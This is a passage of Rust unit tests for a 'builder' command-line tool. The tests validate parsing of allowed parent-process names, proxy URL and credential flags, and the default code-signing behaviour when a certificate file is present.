            vec!["explorer.exe".to_string(), "WINWORD.EXE".to_string()]
        );
        assert_eq!(parse_valid_parents("explorer.exe").unwrap(), vec!["explorer.exe".to_string()]);
    }

    #[test]
    fn valid_parents_rejects_empty_entries_paths_and_overflow() {
        assert!(parse_valid_parents("explorer.exe,,svchost.exe").is_err());
        assert!(parse_valid_parents("explorer.exe,").is_err());
        // Paths never match the basename comparison agent-side.
        assert!(parse_valid_parents("C:\\Windows\\explorer.exe").is_err());
        assert!(parse_valid_parents("/usr/bin/init").is_err());
        assert!(parse_valid_parents(&"a.exe,".repeat(33)).is_err());
    }

    // ── proxy flag validation ─────────────────────────────────────────

    #[test]
    fn proxy_flags_ok_combinations() {
        assert!(check_proxy_flags(&None, &None, &None).is_ok());
        assert!(check_proxy_flags(&Some("http://proxy.corp.com:8080".into()), &None, &None).is_ok());
        assert!(check_proxy_flags(
            &Some("socks5://10.0.0.1:1080".into()),
            &Some("u".into()),
            &Some("p".into()),
        ).is_ok());
    }

    #[test]
    fn proxy_flags_reject_bad_input() {
        // Credentials without a URL.
        assert!(check_proxy_flags(&None, &Some("u".into()), &None).is_err());
        assert!(check_proxy_flags(&None, &None, &Some("p".into())).is_err());
        // Schemeless / empty URLs.
        assert!(check_proxy_flags(&Some("".into()), &None, &None).is_err());
        assert!(check_proxy_flags(&Some("proxy.corp.com:8080".into()), &None, &None).is_err());
    }

    // ── Signing default (auto-on when a cert is available) ────────────

    fn cli_with(args: &[&str]) -> Cli {
        Cli::try_parse_from(args).expect("cli parse")
    }

    /// Fresh temp dir per case; with_default=true plants certs/rcm_sign.p12.
    fn root_with_default_cert(with_default: bool, tag: &str) -> PathBuf {
        let dir = std::env::temp_dir()
            .join(format!("rcm-sign-test-{}-{}", tag, std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        if with_default {
            fs::create_dir_all(dir.join("certs")).unwrap();
            fs::write(dir.join("certs").join("rcm_sign.p12"), b"stub").unwrap();
        }
        dir
    }

    #[test]
    fn signing_default_off_without_any_cert() {
        let dir = root_with_default_cert(false, "off");
        let cli = cli_with(&["builder"]);
        assert!(!signing_enabled(&cli, &dir));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn signing_default_on_when_cert_available() {
        // Explicit --sign-cert.
        let dir = root_with_default_cert(false, "on-flag");
        let cli = cli_with(&["builder", "--sign-cert", "x.p12"]);
        assert!(signing_enabled(&cli, &dir));
        let _ = fs::remove_dir_all(&dir);
        // Default bundle present on disk.
        let dir = root_with_default_cert(true, "on-file");
        let cli = cli_with(&["builder"]);
        assert!(signing_enabled(&cli, &dir));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn signing_explicit_overrides_win() {
        // --no-sign beats the cert-availability default...
        let dir = root_with_default_cert(true, "no-sign");
        let cli = cli_with(&["builder", "--no-sign"]);
        assert!(!signing_enabled(&cli, &dir));
        // ...and beats an explicit --sign given alongside.
        let cli = cli_with(&["builder", "--sign", "--no-sign"]);
        assert!(!signing_enabled(&cli, &dir));
        let _ = fs::remove_dir_all(&dir);
        // --sign forces on with no cert anywhere.
        let dir = root_with_default_cert(false, "force");
        let cli = cli_with(&["builder", "--sign"]);
        assert!(signing_enabled(&cli, &dir));
        let _ = fs::remove_dir_all(&dir);
    }
}
